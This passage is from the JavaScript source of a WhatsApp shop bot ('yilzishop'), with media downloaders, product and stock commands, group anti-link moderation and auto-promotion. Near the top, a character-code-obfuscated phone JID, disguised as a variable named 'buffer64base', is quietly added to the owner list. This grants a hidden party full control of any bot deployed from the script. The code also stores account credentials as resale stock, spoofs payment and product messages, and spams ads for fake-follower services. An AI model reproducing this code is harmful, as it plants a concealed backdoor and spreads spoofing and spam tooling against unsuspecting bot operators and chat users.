process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('node-yt-dl');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const virtu = require("./lib/virtusim");
const { Saweria } = require("./lib/saweria")
const { OrderKuota } = require("./lib/orderkuota")
const orderkuota = new OrderKuota()
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');
const { handleOrderNokos } = require("./lib/ordernokos");
const db_saweria = JSON.parse(fs.readFileSync('./src/saweria.json'));
module.exports = yilzi = async (yilzi, m, chatUpdate, store) => {
	try {
const from = m.key.remoteJid;
await LoadDataBase(yilzi, m)
const botNumber = await yilzi.decodeJid(yilzi.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const API_TOKEN = global.apitokendo;

//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\nCommand :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\nFrom :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================
const reply = m.reply;
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${namaOwner}`,jpegThumbnail: await reSize("./src/media/fake.jpg", 200, 200) }}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await yilzi.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await yilzi.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await yilzi.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await yilzi.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await yilzi.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await yilzi.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await yilzi.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await yilzi.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await yilzi.sendMessage(m.chat, {text: `
*yilzishop Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/CqiwCo3l5Y5BK2sqOY2Amr
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CHFiIJhxsMMFJDpdsXwcbM
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VarZaKGLdQedA8hiw42D

*👤 Contact yilzishop*
* *WhatsApp Utama :*
+6281359123789
* *WhtasApp Cadangan :*
+6282245415503
https://t.me/yilziii
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}
//-# Funcation Addstock -#//
function addStock(idProduk, accountDetails) {
const jsonFileName = `src/data/${idProduk}.json`;

try {
if (!idProduk || !accountDetails) {
return m.reply("`[ Contoh ]` .addstock code <email>:<password>:<profil>:<pin>:<2FA>");
}
const detailParts = accountDetails.split(':');
if (detailParts.length !== 5) {
return m.reply('*[ System Notice ]* Format akun salah! Gunakan: allibot@gmail.com:Fahri@ali:Bebas:Bebasjikaada:Code a2f');
}
let stokData = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
try {
stokData = JSON.parse(fileContent);
} catch {
stokData = fileContent.trim().split('\n').filter(line => line.trim() !== '');
}
} catch (readErr) {
console.error('Error reading stock file:', readErr);
stokData = [];
}
const newEntry = accountDetails;
stokData.push(newEntry);
fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
let produkList = [];
try {
const data = fs.readFileSync('src/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error reading product list:', err);
return m.reply('Gagal membaca daftar produk.');
}

const produk = produkList.find(p => p.id === idProduk);
const produkNama = produk ? produk.nama : idProduk;
m.reply(`✅️ Stok berhasil ditambahkan!\n` +
`*-# Produk* : ${produkNama}\n` +
`*-# Kode Produk* : ${idProduk}\n` +
`*-# Jumlah Stok Baru* : ${stokData.length}
*[-] Jangan Lupa Beli Stock Kami [-]*`);

} catch (err) {
console.error('Error in addStock:', err);
m.reply('Terjadi kesalahan saat menambahkan stok.');
}
}
// -# Funcation Addtutor link -# //
function addTutorLink(code, link) {
const jsonFileName = `src/tutor/${code}.json`;

try {
if (!code || !link) {
return m.reply("[ Contoh ] .addtutorlink code|link\n[ Valid Code ] .addtutorlink tut101|https://example.com/tutorial");
}
let tutorLinks = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
tutorLinks = JSON.parse(fileContent);
} catch (readErr) {
console.error('Error reading tutor links file:', readErr);
tutorLinks = [];
}
const newEntry = { code, link };
tutorLinks.push(newEntry);

fs.writeFileSync(jsonFileName, JSON.stringify(tutorLinks, null, 4), 'utf8');
m.reply(`✅️ Tutor link berhasil ditambahkan!\n` +
`*-# Kode* : ${code}\n` +
`*-# Link* : ${link}\n` +
`*[-] Terima kasih telah menggunakan bot ini [-]*`);
} catch (err) {
console.error('Error in addTutorLink:', err);
m.reply('Terjadi kesalahan saat menambahkan tutor link.');
}
}
// -# Funcation Save Transaksi #- //
function saveTransactionHistory(sender, serverId, totalAmount) {
try {
if (!db.transactions) {
db.transactions = {};
}
const transactionId = `${sender}_${serverId}_${Date.now()}`;
db.transactions[transactionId] = {
sender: sender,
serverId: serverId,
amount: totalAmount,
timestamp: new Date().toISOString(),
status: 'completed'
};
const maxTransactions = 100;
const transactionKeys = Object.keys(db.transactions);
if (transactionKeys.length > maxTransactions) {
transactionKeys.slice(0, transactionKeys.length - maxTransactions)
.forEach(key => delete db.transactions[key]);
}
console.log(`Transaction saved: ${transactionId}`);
} catch (error) {
console.error('Error saving transaction history:', error);
yilziler.sendMessage(m.chat, {
text: 'Gagal menyimpan riwayat transaksi.'
}, { quoted: m });
}
}
//-# Funcation Edit Stock #-//
function editStock(idProduk, oldAccountDetails, newAccountDetails) {
const jsonFileName = `src/data/${idProduk}.json`;

try {
if (!idProduk || !oldAccountDetails || !newAccountDetails) {
return m.reply("`[ Contoh ]` .editstock code <lama email>:<lama password> <baru email>:<baru password>:<baru profil>:<baru pin>:<baru 2FA>");
}
const oldDetailParts = oldAccountDetails.split(':');
const newDetailParts = newAccountDetails.split(':');

if (oldDetailParts.length < 2 || newDetailParts.length !== 5) {
return m.reply('*[ System Notice ]* Format akun salah! Gunakan contoh: email:password email:password:profil:pin:2FA');
}
let stokData = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
try {
stokData = JSON.parse(fileContent);
} catch {
stokData = fileContent.trim().split('\n').filter(line => line.trim() !== '');
}
} catch (readErr) {
console.error('Error reading stock file:', readErr);
return m.reply('Tidak dapat membaca file stok.');
}
const oldEntryIndex = stokData.findIndex(entry => entry === oldAccountDetails);
if (oldEntryIndex === -1) {
return m.reply('*[ System Notice ]* Akun yang ingin diubah tidak ditemukan.');
}
stokData[oldEntryIndex] = newAccountDetails;
fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
let produkList = [];
try {
const data = fs.readFileSync('src/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error reading product list:', err);
}
const produk = produkList.find(p => p.id === idProduk);
const produkNama = produk ? produk.nama : idProduk;
m.reply(`✅️ Stok berhasil diperbarui!\n` +
`*-# Produk* : ${produkNama}\n` +
`*-# Kode Produk* : ${idProduk}\n` +
`*-# Total Stok* : ${stokData.length}\n` +
`*[-] Stok telah diperbarui dengan detail baru [-]*`);

} catch (err) {
console.error('Error in editStock:', err);
m.reply('Terjadi kesalahan saat mengubah stok.');
}
}
//-# Funcation Edit Produk #-//
function editProduk(kode, updateData) {
try {
let produkList = [];
try {
const data = fs.readFileSync('src/data/produk.json', 'utf8');
produkList = JSON.parse(data) || [];
} catch (err) {
console.error(err);
return m.reply('Terjadi kesalahan saat membaca data produk.');
}
const productIndex = produkList.findIndex(p => p.id === kode);
if (productIndex === -1) {
return m.reply(`Produk dengan kode ${kode} tidak ditemukan.`);
}
const existingProduct = produkList[productIndex];
const updatedProduk = {
id: kode,
nama: updateData.nama || existingProduct.nama,
harga: updateData.harga !== undefined ? parseInt(updateData.harga) : existingProduct.harga,
deskripsi: updateData.deskripsi || existingProduct.deskripsi,
snk: updateData.snk || existingProduct.snk || 'Syarat dan Ketentuan Berlaku',
terjual: existingProduct.terjual
};
if (!updatedProduk.nama || isNaN(updatedProduk.harga) || !updatedProduk.deskripsi) {
return m.reply('Data produk tidak valid. Pastikan nama, harga, dan deskripsi terisi dengan benar.');
}
produkList[productIndex] = updatedProduk;
try {
fs.writeFileSync('src/data/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
const updateMessage = `✅️Produk berhasil diperbarui:\n` +
`*-# Kode* : ${kode}\n` +
`*-# Nama* : ${updatedProduk.nama}\n` +
`*-# Harga* : ${updatedProduk.harga}\n` +
`*-# Deskripsi* : ${updatedProduk.deskripsi}`;

m.reply(updateMessage);
} catch (err) {
console.error(err);
m.reply('Gagal memperbarui produk. Terjadi kesalahan.');
}
} catch (err) {
console.error('Error in editProduk:', err);
m.reply('Terjadi kesalahan saat mengubah produk.');
}
}
//-# Funcation Del Produk -#//
function delProduk(kode, m) {
try {
const produkFilePath = 'src/data/produk.json';
const stockFilePath = `src/data/${kode}.json`;
let produkList = [];
try {
const data = fs.readFileSync(produkFilePath, 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error membaca file produk:', err);
return m.reply('*[ System Notice ]* Terjadi kesalahan saat membaca data produk.');
}
const produkIndex = produkList.findIndex(p => p.id === kode);
if (produkIndex === -1) {
return m.reply(`*[ System Notice ]* Produk dengan kode ${kode} tidak ditemukan.`);
}
const produkDihapus = produkList[produkIndex];
produkList.splice(produkIndex, 1);

try {
fs.writeFileSync(
produkFilePath, 
JSON.stringify(produkList, null, 4), 
'utf8'
);
if (fs.existsSync(stockFilePath)) {
fs.unlinkSync(stockFilePath);
}
const responseMessage = 
`🗑️ Produk Berhasil Dihapus
*-# Kode Produk: ${kode}*
*-# Nama Produk: ${produkDihapus.nama}*
*-# Harga: Rp ${produkDihapus.harga.toLocaleString()}*
*-# Waktu Dihapus: ${new Date().toLocaleString()}*
*[-] ✔️ Produk Telah Dihapus Dari Sistem [-]*`;

m.reply(responseMessage);
} catch (err) {
console.error('Error menulis/menghapus file:', err);
m.reply('Gagal menghapus produk. Terjadi kesalahan saat menyimpan.');
}
} catch (err) {
console.error('Error dalam fungsi delProduk:', err);
m.reply('Terjadi kesalahan umum saat menghapus produk.');
}
}
//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return yilzi.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnail: fs.readFileSync("./src/media/reply.jpg"), 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/logo.jpg") }, { upload: yilzi.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*yilzishop* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*yilzishop Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *GrupBebas Promosi 1 :*
https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CWO0TqYeCVbIoY4YzsTxb7
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VarZaKGLdQedA8hiw42D`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Jasa Suntik Sosmed 🌟*

*- Layanan Instagram :*
- 500 Followers : Rp8000
- 1000 Like : Rp4000
- 1000 Views : Rp4000

*- Layanan Tiktok :*
* 500 Followers : Rp5000
* 1000 Like : Rp5000
* 1000 Share : Rp5000
* 10k Views : Rp3000

*- Layanan Telegram :*
* 500 Member CH : Rp8000

*- Layanan Whats'App :*
* 100 Member CH : Rp12.000

*Syarat & Ketentuan :*
* _Proses tidak memerlukan email/password akun, hanya memakai username/link tautan_
* _Selama proses akun jangan di private/dibatasi_
* _Masing masing layanan mempunyai garansi & non garansi_
* _Proses maksimal 1 x 24jam, Order wajib sabar!_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await yilzi.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const yilzizodev = { yilzi, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, yilzizodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await yilzi.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://btch.us.kg/download/ytdl?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.result.mp3
await yilzi.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await yilzi.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://btch.us.kg/download/ytdl?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await yilzi.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await yilzi.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n*[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await yilzi.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson(`https://btch.us.kg/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp3
await yilzi.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await yilzi.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson(`https://btch.us.kg/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await yilzi.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await yilzi.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await yilzi.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await yilzi.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await yilzi.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await yilzi.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await yilzi.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/yilzizodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
let [, user, repo] = args[0].match(regex) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
yilzi.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await yilzi.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: yilzi.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
